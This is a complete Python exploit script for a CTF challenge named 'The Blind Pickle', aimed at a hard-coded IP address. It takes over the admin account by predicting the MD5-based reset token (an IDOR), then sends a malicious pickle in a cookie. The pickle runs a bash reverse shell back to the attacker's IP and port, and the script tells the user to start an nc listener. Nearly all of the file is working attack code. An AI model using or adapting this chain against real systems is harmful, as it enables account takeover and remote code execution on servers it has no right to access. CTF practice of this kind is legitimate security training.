#!/usr/bin/env python3
import requests
import pickle
import base64
import hashlib
import sys

# Configuration
TARGET = "http://84.247.129.120:45002/"
YOUR_IP = input("Enter your IP address: ").strip()
YOUR_PORT = input("Enter your listening port (e.g., 4444): ").strip()

print("\n[*] Starting exploit for The Blind Pickle CTF")
print(f"[*] Target: {TARGET}")
print(f"[*] Reverse shell to: {YOUR_IP}:{YOUR_PORT}")
print("\n[!] Make sure you have a listener running: nc -lvnp {}\n".format(YOUR_PORT))

# Step 1: Calculate admin's uid_token
admin_uid = 1
admin_token = hashlib.md5(str(admin_uid).encode()).hexdigest()
print(f"[+] Admin user_id: {admin_uid}")
print(f"[+] Admin uid_token (md5): {admin_token}")

# Step 2: Reset admin password via IDOR
print("\n[*] Step 1: Exploiting IDOR to reset admin password...")
s = requests.Session()

reset_data = {
    'uid_token': admin_token,
    'new_password': 'pwned123'
}

try:
    r = s.post(f"{TARGET}/reset/confirm", data=reset_data, timeout=10)
    if "Password updated" in r.text or r.status_code == 200:
        print("[+] Admin password successfully reset to 'pwned123'")
    else:
        print("[-] Password reset may have failed, but continuing...")
except Exception as e:
    print(f"[-] Error during password reset: {e}")
    sys.exit(1)

# Step 3: Login as admin
print("\n[*] Step 2: Logging in as admin...")
login_data = {
    'username': 'admin',
    'password': 'pwned123'
}

try:
    r = s.post(f"{TARGET}/login", data=login_data, timeout=10)
    if 'session' in s.cookies:
        print("[+] Successfully logged in as admin!")
        print(f"[+] Session cookie: {s.cookies.get('session')[:50]}...")
    else:
        print("[-] Login failed!")
        sys.exit(1)
except Exception as e:
    print(f"[-] Error during login: {e}")
    sys.exit(1)

# Step 4: Craft malicious pickle payload
print("\n[*] Step 3: Crafting malicious pickle payload...")

class Exploit:
    def __reduce__(self):
        import os
        cmd = f'bash -c "bash -i >& /dev/tcp/{YOUR_IP}/{YOUR_PORT} 0>&1"'
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(f"[+] Payload crafted (base64): {payload[:50]}...")

# Step 5: Trigger RCE by sending payload to /admin
print("\n[*] Step 4: Sending payload to /admin endpoint...")
s.cookies.set('adminprefs', payload)

try:
    r = s.get(f"{TARGET}/admin", timeout=10)
    print("[+] Payload sent successfully!")
    print("[+] Check your listener for the reverse shell!")
    print("\n[*] If successful, you should now have a shell on the target.")
    print("[*] Look for the flag in common locations like /flag.txt, /home/*/flag.txt, etc.")
except Exception as e:
    print(f"[-] Error sending payload: {e}")
    sys.exit(1)

print("\n[*] Exploit complete!")
